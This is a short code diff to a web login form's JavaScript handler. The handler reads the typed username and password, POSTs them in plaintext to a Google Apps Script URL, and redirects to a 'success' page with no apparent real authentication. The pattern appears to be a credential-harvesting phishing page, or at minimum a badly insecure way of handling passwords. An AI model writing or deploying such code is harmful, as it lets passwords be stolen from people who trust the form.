@@ -1,18 +1,12 @@
-document
-  .getElementById("loginForm")
-  .addEventListener("submit", function(e){
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+  e.preventDefault();
 
-    e.preventDefault();
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-    const username =
-      document.getElementById("username").value;
-
-    const password =
-      document.getElementById("password").value;
-
-    fetch("https://script.google.com/macros/s/AKfycbwzI2Jbh5meO_8Az32zhAjZcW-Z5lh7-UErYpf3-YL8OM5Ble3QzolxaHFWVo7WJEb0/exec", {
+  try {
+    await fetch("https://script.google.com/macros/s/AKfycbwzI2Jbh5meO_8Az32zhAjZcW-Z5lh7-UErYpf3-YL8OM5Ble3QzolxaHFWVo7WJEb0/exec", {
       method: "POST",
-      mode: "no-cors",
       body: new URLSearchParams({
         username,
         password
@@ -20,4 +14,8 @@ document
     });
 
     window.location.href = "success.html";
+
+  } catch (err) {
+    console.log("failed:", err);
+  }
 });
